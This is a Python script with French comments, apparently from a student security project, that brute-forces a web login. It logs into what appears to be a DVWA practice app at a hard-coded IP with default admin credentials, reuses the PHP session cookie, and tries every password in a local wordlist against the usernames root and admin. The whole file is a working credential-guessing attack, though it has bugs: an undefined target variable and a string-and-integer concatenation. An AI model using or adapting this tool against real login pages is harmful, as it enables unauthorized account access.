from subprocess import Popen, PIPE
import requests
import sys
from bs4 import BeautifulSoup


def getCookie():
    with requests.Session() as session:
        html = session.get('http://45.147.96.25:4242/login.php')
        html_parsed = BeautifulSoup(html.text, "html.parser")
        user_token = html_parsed.find('input', { "type" : "hidden" })['value']
        creds = {
            "username"   : 'admin',
            "password"   : 'password',
            "Login"      : "Submit",
            "user_token" : user_token
        }
        request = session.post('http://45.147.96.25:4242/login.php', data = creds)
        cookie = html.cookies.get_dict()
        session.close()
    return cookie


def bruteForce(phpSession):
    passwordList = "C:\\Users\\Const\\Documents\\Projet_Secu\\BOTRK\\botrk_back\\password_list.txt"
    # Definition des listes de nom d'utilisateur et de mot de passe à essayer
    usernameList = {"root", "admin"}
    with open(passwordList) as passwords:
        passwords = passwords.readlines()

    # Début des boucles for des essais de login et definition d'un compteur pour l'affichage
    i = 1
    for password in passwords:
        for username in usernameList:
            password = password.rstrip('\n')
            # Execution de la tentative en cours
            response = bruteRequest(username, password, phpSession)

            # Vérification de la reponse pour savoir si la combinaison est valide
            if('Welcome to the password protected area' in response):
                print("\n[✅] Found working credential ! \n\t Username: " + username + "\n\t Password: " + password)
                return True
            
            # Affichage de la tentative en cas d'échec à l'utilisateur
            print("[❌] [" + str(i) + "] Tried with U: " + username + " P: " + password)

            # Incrémentation du compteur pour l'affichage
            i += 1
    return False

def bruteRequest(username, password, phpSession):
    # Ajout de la session ID pour l'authentification
    cookie = {
        "PHPSESSID": phpSession,
        "security": "low"
    }

    # Listes des paramêtres de la requète Get
    getParams = {
        "username": username,
        "password": password,
        "Login": "Login"
    }

    # Envoie de la requètes avec les bons paramètres
    response = requests.get("{0}".format(target), params=getParams, cookies=cookie, allow_redirects=False)

    # Verification du code HTTP de retour de la réponse 
    if response.status_code != 200:
        # Onaffiche le code erreur et on stop le programme
        print("\n[!] HTTP error code" + response.status_code)
        sys.exit(-1)
    
    # On retourne le text de la réponse
    return response.text





# Appel de la fonction bruteforce
bruteForce(getCookie()['PHPSESSID'])

